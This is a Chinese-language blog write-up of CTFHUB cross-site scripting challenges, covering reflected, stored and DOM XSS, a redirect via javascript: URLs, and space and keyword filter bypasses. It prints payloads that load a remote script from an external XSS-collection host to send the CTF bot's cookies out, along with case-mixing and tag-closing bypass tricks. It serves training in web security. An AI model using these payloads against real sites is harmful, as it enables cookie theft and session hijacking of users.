---
title: Write up CTFHUB XSS
date: 2025-08-25 21:36:45
tags:
    - CTF
    - Web安全
    - Writeup
    - ctfhub
    - xss
categories:
    - CTF
    - Web
    - Writeup
---

# 前言

跨站脚本（Cross-Site Scripting，XSS）是一种经常出现在 WEB 应用程序中的计算机安全漏洞，是由于 WEB 应用程序对用户的输入过滤不足而产生的。攻击者利用网站漏洞把恶意的脚本代码注入到网页中，当其他用户浏览这些网页时，就会执行其中的恶意代码，对受害用户可能采取 Cookies 资料窃取、会话劫持、钓鱼欺骗等各种攻击。

这两天在 CTFHUB 练习了一下 XSS 相关的题。

![image.png](https://s2.loli.net/2025/08/25/G6NyFRjczC2Q3ok.png)

# 准备
XSS 主要分为 **反射型 XSS** 、**存储型 XSS** 和 **DOM XSS** ，大部分 CTF XSS 最终目的都是获取 Cookie ，也就是需要一个服务端接收脚本发送过来的数据。我们可以借助一些 XSS 平台来实现信息接收，也可以自己实现一个服务暴露到公网中。

我这里使用 XSS 平台来接收数据，注册及设置过程不过多赘述，平台地址：https://xssjs.com/

在 XSS 平台设置完项目后，即可得到注入的脚本代码，可以看到代码就是会下载并执行 XSS 平台上返回的 JavaScript 代码，那里面的才是真正的恶意代码。

```
<sCRiPt sRC=//ujs.ci/2li></sCrIpT>  // https://ujs.ci/2li 里面有恶意代码
```

![2.png](https://s2.loli.net/2025/08/25/ADTnZ9BRkfjdsIQ.png)

# 做题

## 反射型 XSS

一打开链接，就能看到两个框。一开始我是一脸懵逼的，看了一下网页代码以及回想了一下 XSS 原理，才大概知道这两个框是什么意思。

第一个框是真实场景中用户的输入框，我们需要通过这个输入来注入恶意脚本；而第二个框则是为 CTF 服务的，CTF 平台后台会有机器人自动请求第二个输入框中的链接，以模仿真实用户的请求。

而我们要做的，就是先通过第一个输入来注入恶意脚本，随后在第二个框输入被注入 XSS 攻击的网站链接，以窃取 CTF 平台后台机器人的 Cookie。

![1.png](https://s2.loli.net/2025/08/25/x8y7dG6b5lRUgKC.png)

随便在第一个框中做了一些注入，分析 HTML 源码发现没做任何过滤，那就直接注入我们的代码吧。

![3.png](https://s2.loli.net/2025/08/25/zpDfrniK6OCJbSY.png)
![4.png](https://s2.loli.net/2025/08/25/VWPcxndMjOIfBeT.png)

这很明显是个反射型 XSS ，直接回显 Get 参数里的 name 参数值，把这个链接复制到第二个框中，让机器人请求。

![5.png](https://s2.loli.net/2025/08/25/uvyoR8DnilaOkzg.png)

来到 XSS 平台的项目后台，可以看到窃取的信息，flag 就在 Cookie 里面。

![6.png](https://s2.loli.net/2025/08/25/l6ocYap1mFEd3Oy.png)

## 存储型 XSS
解题步骤和上一题完全一样，这里就不过多赘述了。

不过需要理解存储型 XSS 和反射型 XSS 的区别：

反射型 XSS 的恶意代码一般出现在网站搜索栏、用户登录口的等地方，恶意代码通常在 URL 中，像上一题的 Get 参数里的 name 参数就是如此，当受害者点击这些专门设计的链接时才会中招。

而存储型 XSS 不需要用户单击特定 URL 就能执行跨站脚本，攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码，存储型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。

## DOM XSS
DOM XSS 是基于 DOM 文档对象模型的一种漏洞，JS 可以通过 DOM 动态检查、修改页面内容。如果用户在客户端输入的数据中注入恶意脚本，而脚本没有被过滤，那就可能受到 DOM XSS 攻击。

查看代码可以清楚地看到输入的内容是没有经过任何过滤的，会直接插入到页面中。

![1.png](https://s2.loli.net/2025/08/25/3vwxNIQe59nBqZL.png)

![2.png](https://s2.loli.net/2025/08/25/oMjCD5ORdyL8HVX.png)

但是这次不能直接输入 &#x3C;&#x73;&#x43;&#x52;&#x69;&#x50;&#x74;&#x20;&#x73;&#x52;&#x43;&#x3D;&#x2F;&#x2F;&#x75;&#x6A;&#x73;&#x2E;&#x63;&#x69;&#x2F;&#x32;&#x6C;&#x69;&#x3E;&#x3C;&#x2F;&#x73;&#x43;&#x72;&#x49;&#x70;&#x54;&#x3E; ，直接输入的效果如下。可以看到输入的内容中含有 script 结束标签，导致原本的标签被提前结束了，最终修改页面的脚本执行失败，所以得考虑怎么正确闭合修改页面脚本的 JS 标签才行。

![image.png](https://s2.loli.net/2025/08/25/tZhc5QbGFzXP7ep.png)
![image.png](https://s2.loli.net/2025/08/25/Tsa3NhyVUXEwIqF.png)

经过思考，输入的内容如下：
```
';</script><sCRiPt sRC=//ujs.ci/2li></sCrIpT>
```

最终效果如下，先用 &#x27;&#x3B;&#x3C;&#x2F;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E; 把前面那段脚本的标签闭合，这样后面的 &#x3C;&#x73;&#x43;&#x52;&#x69;&#x50;&#x74;&#x20;&#x73;&#x52;&#x43;&#x3D;&#x2F;&#x2F;&#x75;&#x6A;&#x73;&#x2E;&#x63;&#x69;&#x2F;&#x32;&#x6C;&#x69;&#x3E;&#x3C;&#x2F;&#x73;&#x43;&#x72;&#x49;&#x70;&#x54;&#x3E; 就能正常注入到 HTML 中了。

![image.png](https://s2.loli.net/2025/08/25/SZpr4iyjUhAc52l.png)


把链接输入到第二个框中，查看 XSS 平台后台，从 Cookie 中拿到 flag ！

![image.png](https://s2.loli.net/2025/08/25/SyzjU1q3faMVsXA.png)

## DOM 跳转

这道题的第一个输入框倒是被锁定了，不允许输入。

![1.png](https://s2.loli.net/2025/08/25/KSArijzC2D97Rwb.png)

从网页代码可以看出来，这段脚本会把 GET 参数里的 jumpto 参数值提取出来，使用 location.href 跳转页面（重定向）。

![2.png](https://s2.loli.net/2025/08/25/gpksGzIy5cNhaf7.png)

那这里可以使用 javascript: 协议配合 jQuery 的 $.getScript() 来动态加载、执行我的恶意脚本代码。
> 在浏览器地址栏或者某些跳转逻辑中，如果 URL 以 javascript:代码开头，浏览器就会把后面的内容当作 JavaScript 来执行。

> $.getScript(url, callback) 是 jQuery 提供的 API，用于从指定 URL 动态加载并执行一段 JS 文件。

直接构造链接输入到第二个框中

```
?jumpti=javascript:$.getScript("恶意脚本链接"))
```

![3.png](https://s2.loli.net/2025/08/25/PDt5siSZjIf2xJu.png)

来到 XSS 平台后台，拿到 flag ！

![image.png](https://s2.loli.net/2025/08/25/nMUk1JmTc64vrHR.png)

## 过滤空格

这道题会把空格过滤掉，我输入 &#x3C;&#x73;&#x43;&#x52;&#x69;&#x50;&#x74;&#x20;&#x73;&#x52;&#x43;&#x3D;&#x2F;&#x2F;&#x75;&#x6A;&#x73;&#x2E;&#x63;&#x69;&#x2F;&#x32;&#x6C;&#x69;&#x3E;&#x3C;&#x2F;&#x73;&#x43;&#x72;&#x49;&#x70;&#x54;&#x3E; 后变成了
&#x3C;&#x73;&#x43;&#x52;&#x69;&#x50;&#x74;&#x73;&#x52;&#x43;&#x3D;&#x2F;&#x2F;&#x75;&#x6A;&#x73;&#x2E;&#x63;&#x69;&#x2F;&#x32;&#x6C;&#x69;&#x3E;&#x3C;&#x2F;&#x73;&#x43;&#x72;&#x49;&#x70;&#x54;&#x3E; 

![2.png](https://s2.loli.net/2025/08/25/BGS3JUYQb16PHir.png)

可以用注释 /**/ 绕过。

![2.png](https://s2.loli.net/2025/08/25/BGS3JUYQb16PHir.png)

## 过滤关键词

这道题更是把 script 直接过滤掉了

![1.png](https://s2.loli.net/2025/08/25/KCUAboxYHRBtg63.png)

尝试用大小写混淆的方式绕过（其实我一开始就是用大小写混淆）

![2.png](https://s2.loli.net/2025/08/25/KixAnIZ4N7GHBOL.png)

# 感想
昨天我使用 http://test.xss.tv/ 简单练习了一下 XSS ，但是 XSS 最终目的是窃取用户数据，不是简单的 alert('xxx') ，这次结合 XSS 平台了解了通过 XSS 窃取用户数据的完整流程，这不禁让我想起十几二十年前 QQ 空间、QQ 邮箱的 XSS 漏洞，原来是这么一回事啊！怪不得以前 QQ 空间老是中招呢！

![image.png](https://s2.loli.net/2025/08/25/jMhbsr2uED7dZ1w.png)


